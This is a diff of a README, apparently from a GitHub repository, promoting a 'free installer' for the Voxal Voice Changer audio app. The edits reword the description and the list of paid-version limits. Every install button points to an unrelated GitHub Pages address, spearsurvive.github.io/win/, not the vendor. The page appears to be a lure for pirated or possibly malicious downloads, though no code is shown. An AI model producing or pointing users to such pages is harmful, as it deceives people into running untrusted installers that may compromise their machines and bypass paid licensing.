@@ -5,10 +5,10 @@
   <img src="https://img.shields.io/badge/Rating-4.9%2F5-F9A825?style=for-the-badge&logo=star" />
   <img src="https://img.shields.io/badge/Version-2026-101010?style=for-the-badge&logo=github" />
   <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS-informational?style=for-the-badge&logo=windows" />
-  <img src="https://img.shields.io/badge/Category-Audio+Utility-E63946?style=for-the-badge&logo=appstore" />
+  <img src="https://img.shields.io/badge/Category-Audio+Tool-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Voxal Voice Changer Free Installer** — Voxal Voice Changer is a real-time voice modulation software that applies audio effects to your microphone input. Works without internet access, no account required. Full offline installation.
+**💻 Voxal Voice Changer Free Installer** — Voxal Voice Changer is a real-time voice modulation application for Windows and macOS. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Voxal Voice Changer](https://img.shields.io/badge/⬇_Install_Voxal%20Voice%20Changer-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Voxal Voice Changer](https://img.shields.io/badge/⬇_Install_Voxal+Voice+Changer-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Voxal Voice Changer
 
-Voxal Voice Changer is a real-time voice modulation software that applies audio effects to your microphone input. It supports pitch shifting, custom effects creation, and works with all voice chat applications — useful for gaming, streaming, and content creation.
+Voxal Voice Changer is a real-time voice modulation application for Windows and macOS. Apply robot, alien, girl, boy, deep, and custom voice effects to microphone input in real time for gaming, streaming, voice chat, and creative applications. Configure custom voice effect chains and apply them to any application that uses microphone input through a virtual audio device.
 
 ---
 
 ## ❌ Problem: Voxal Voice Changer is hard to access
 
-- **Freemium Limits** — Commercial use and some effects require paid license
-- **Latency** — Real-time processing adds slight audio latency to voice output
-- **Effect Quality** — Effects sound less natural than premium alternatives like NVIDIA RTX Voice
-- **Resource Usage** — Continuous audio processing increases CPU load during use
+- **Commercial License** — Free version has limited effects; Pro required for full functionality
+- **Virtual Audio Setup** — Requires configuring virtual audio device as microphone input in applications
+- **Audio Latency** — Real-time processing adds slight audio latency
+- **Effect Quality** — Lower-quality effects less convincing than specialized voice AI solutions
 
 ---
 
@@ -81,7 +81,7 @@ Voxal Voice Changer is a real-time voice modulation software that applies audio 
 
 <div align="center">
 
-[![⬇ Install Voxal Voice Changer](https://img.shields.io/badge/⬇_Install_Voxal%20Voice%20Changer-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Voxal Voice Changer](https://img.shields.io/badge/⬇_Install_Voxal+Voice+Changer-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ Voxal Voice Changer is a real-time voice modulation software that applies audio 
 
 ---
 
-**Voxal Voice Changer Free Installer** — Voxal Voice Changer is a real-time voice modulation software that applies audio effects to your microphone input. Install without internet connection today!
+**Voxal Voice Changer Free Installer** — Voxal Voice Changer is a real-time voice modulation application for Windows and macOS. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Voxal Voice Changer](https://img.shields.io/badge/⬇_Install_Voxal%20Voice%20Changer-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Voxal Voice Changer](https://img.shields.io/badge/⬇_Install_Voxal+Voice+Changer-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
